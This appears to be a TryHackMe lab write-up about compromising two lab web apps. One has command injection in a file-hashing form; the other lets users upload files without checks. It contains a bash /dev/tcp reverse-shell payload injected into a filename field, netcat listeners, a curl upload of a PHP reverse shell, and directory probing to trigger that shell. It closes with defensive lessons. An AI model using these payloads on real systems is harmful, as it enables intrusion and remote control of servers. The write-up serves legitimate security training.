# TryHackMe — Reverse Shells (Command Injection & Unrestricted File Upload)

## Overview
Exploit two separate web application vulnerabilities on a lab target to pop a shell and retrieve flags from `/`:
- **Task A:** Command injection on a "Hash The File" utility (port `8081`)
- **Task B:** Unrestricted file upload on a "CV Upload" form (port `8082`)

## Task A — Command Injection

**Target:** `http://<target-ip>:8081`

The app takes a filename and hashes it server-side, almost certainly via something like:
```python
os.system(f"sha256sum {user_input}")
```

### Steps

1. Confirmed baseline behavior — submitting `hello.txt` returned a SHA-256 hash + filename, confirming the input is passed straight to a shell command.
2. Confirmed injection with a harmless payload:
   ```
   hello.txt; whoami
   ```
   Response leaked `www-data`, confirming command injection and the running user.
3. Started a listener on the attack box:
   ```
   nc -lvnp 4444
   ```
4. Sent the reverse shell payload through the same input field:
   ```
   hello.txt; bash -i >& /dev/tcp/<attackbox-ip>/4444 0>&1
   ```
5. Caught the shell on the listener and read the flag:
   ```
   cat /flag*
   ```

**Vulnerability:** unsanitized user input concatenated directly into a shell command (OS command injection).

---

## Task B — Unrestricted File Upload

**Target:** `http://<target-ip>:8082`

A "Data Scientist Position — Upload Your CV" form with no server-side validation on file type.

### Recon

Viewed the page source to find the real form details:
```html
<form action="index.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="fileToUpload" id="fileToUpload">
  <input type="submit" name="submit" value="Upload Your CV">
</form>
```

### Steps

1. Generated a PHP web shell (revshells.com → **PHP Ivan Sincek** — a proper `<?php ?>` script, not a CLI one-liner) pointed at the attack box IP and a second port.
2. Started a second listener:
   ```
   nc -lvnp 4445
   ```
3. Saved the generated code to a local file:
   ```
   nano shell.php
   ```
4. Uploaded it via curl, matching the real field names found in the form source:
   ```
   curl -v -F "fileToUpload=@shell.php" -F "submit=Upload Your CV" http://<target-ip>:8082/index.php
   ```
5. The app accepted the upload but didn't reveal the storage path, so brute-forced common upload directories:
   ```
   curl -s -o /dev/null -w "%{http_code}\n" http://<target-ip>:8082/uploads/shell.php
   curl -s -o /dev/null -w "%{http_code}\n" http://<target-ip>:8082/uploads/shell.phtml
   curl -s -o /dev/null -w "%{http_code}\n" http://<target-ip>:8082/cv/shell.php
   curl -s -o /dev/null -w "%{http_code}\n" http://<target-ip>:8082/resumes/shell.php
   curl -s -o /dev/null -w "%{http_code}\n" http://<target-ip>:8082/files/shell.php
   curl -s -o /dev/null -w "%{http_code}\n" http://<target-ip>:8082/cvs/shell.php
   curl -s -o /dev/null -w "%{http_code}\n" http://<target-ip>:8082/static/uploads/shell.php
   ```
6. A `200` response identified the correct path. Visiting that URL triggered the PHP shell, which connected back to the 4445 listener.
7. Read the flag:
   ```
   cat /flag*
   ```

**Vulnerability:** no server-side file type/extension validation on upload, combined with a publicly guessable/accessible upload directory — allowed uploading and executing an arbitrary PHP web shell.

---

## Key Takeaways

- Command injection: never pass unsanitized user input into a shell call — use parameterized library calls (e.g. `hashlib` in Python) instead of shelling out.
- File upload: validate file type server-side (not just client-side JS), store uploads outside the webroot or with non-executable permissions, and randomize/obscure stored filenames.
- When a web app accepts input but doesn't echo back where something landed, directory brute-forcing (gobuster/curl probing) is the standard move to locate it.
